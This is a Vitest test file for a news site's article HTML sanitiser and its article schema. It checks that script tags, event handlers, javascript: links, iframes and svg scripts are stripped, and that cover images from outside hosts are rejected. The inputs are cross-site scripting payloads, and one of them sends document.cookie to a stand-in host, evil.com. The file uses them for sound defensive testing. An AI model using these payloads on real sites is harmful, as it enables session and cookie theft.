import { describe, expect, it } from "vitest";
import { articleSchema, cleanArticleHtml } from "@/lib/articles";

describe("cleanArticleHtml", () => {
  it.each([
    ["a script tag", `<p>ok</p><script>fetch("//evil.com?c="+document.cookie)</script>`],
    ["an image with onerror", `<img src=x onerror="alert(1)">`],
    ["an event handler", `<p onclick="alert(1)">texte</p>`],
    ["a javascript: link", `<a href="javascript:alert(1)">clic</a>`],
    ["an iframe", `<iframe src="https://evil.com"></iframe>`],
    ["an inline style", `<p style="position:fixed;inset:0">plein écran</p>`],
    ["a script inside svg", `<svg><script>alert(1)</script></svg>`],
  ])("removes %s", (_, html) => {
    expect(cleanArticleHtml(html)).not.toMatch(
      /<script|onerror|onclick|javascript:|<iframe|<img|<svg|style=/i,
    );
  });

  it("keeps what the editor produces and hardens links", () => {
    expect(
      cleanArticleHtml(`<p>Un <strong>texte</strong> et un <a href="https://uac.bj">lien</a></p>`),
    ).toBe(
      `<p>Un <strong>texte</strong> et un <a href="https://uac.bj" rel="noopener noreferrer">lien</a></p>`,
    );
  });
});

describe("articleSchema", () => {
  const base = {
    title: "Une actualité",
    content: "<p>Texte</p>",
    coverImageUrl: "",
    published: true,
  };

  it("accepts an article with or without a cover from the project's bucket", () => {
    expect(articleSchema.safeParse(base).success).toBe(true);
    const cover =
      "https://project.supabase.co/storage/v1/object/public/photos/1778-partenariat.jpg";
    expect(articleSchema.safeParse({ ...base, coverImageUrl: cover }).success).toBe(true);
  });

  it("refuses a cover hosted anywhere else", () => {
    expect(
      articleSchema.safeParse({ ...base, coverImageUrl: "https://tracker.example/pixel.gif" })
        .success,
    ).toBe(false);
  });
});
